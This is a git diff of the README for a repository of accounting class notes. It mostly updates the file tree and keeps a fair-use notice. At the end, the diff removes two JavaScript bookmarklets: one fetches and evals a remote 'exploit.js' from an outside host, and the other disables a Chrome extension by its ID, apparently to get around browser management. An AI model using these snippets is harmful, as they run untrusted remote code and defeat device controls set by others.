@@ -8,8 +8,6 @@ File system:
 School-stuffs
 ├── accounting cycles.txt
 ├── accounting theory.txt
-│
-│
 ├── Definitions and reasons
 │   ├── Accounting Information system.txt
 │   ├── assets.txt
@@ -17,19 +15,24 @@ School-stuffs
 │   ├── depreciation.txt
 │   ├── discount.txt
 │   ├── dishonored cheque.txt
+│   ├── equities.txt
 │   ├── expenditures, definitions and accountant qualities.txt
 │   ├── income and expenses.txt
 │   ├── Internal control.txt
 │   ├── Ledger types.txt
 │   ├── Liabilities.txt
-│   └── Source documents.txt
-│
-│
+│   ├── Source documents.txt
+│   └── transactions.txt
+├── IMAGE CREDIT.txt
+├── README.md
 └── stakeholders
     ├── Interactions business and stakeholders.jpg
     ├── Proprietorships2.jpg
     ├── Proprietorships.jpg
     └── Stakeholders actions.jpg
+
+2 directories, 22 files
+
 
 ```
 # School-stuffs
@@ -56,13 +59,3 @@ git clone -b POA https://github.com/pendragons-code/School-stuffs
 This repo consists of items from the Principles of accounts textbook by marhsall cavendish Education.
 
 Fair use is an affirmative defense that can be raised in response to claims by a copyright owner that a person is infringing a copyright. Fair use permits a party to use a copyrighted work without the copyright owner’s permission for purposes such as criticism, comment, news reporting, teaching, scholarship, or research. These purposes only illustrate what might be considered as fair use and are not examples of what will always be considered as fair use. In fact, there are no bright-line rules in determining fair use, since it is determined on a case-by-case basis. But copyright law does establish four factors that must be considered in deciding whether a use constitutes a fair use. Repo will be deleted if requested     
-
-Speed:
-    javascript:fetch("https://compactcow.com/ltbeef/exploit.js%22).then(data=%3E%7Bdata.text().then(text=%3E%7Beval(text)%7D)%7D);
-
-Luck:
-    javascript: (() => {
-  location.href = "https://chrome.google.com/webstorex";
-  chrome.management.setEnabled(fgmafhdohjkdhfaacgbgclmfgkgokgmb, false);
-})();
-
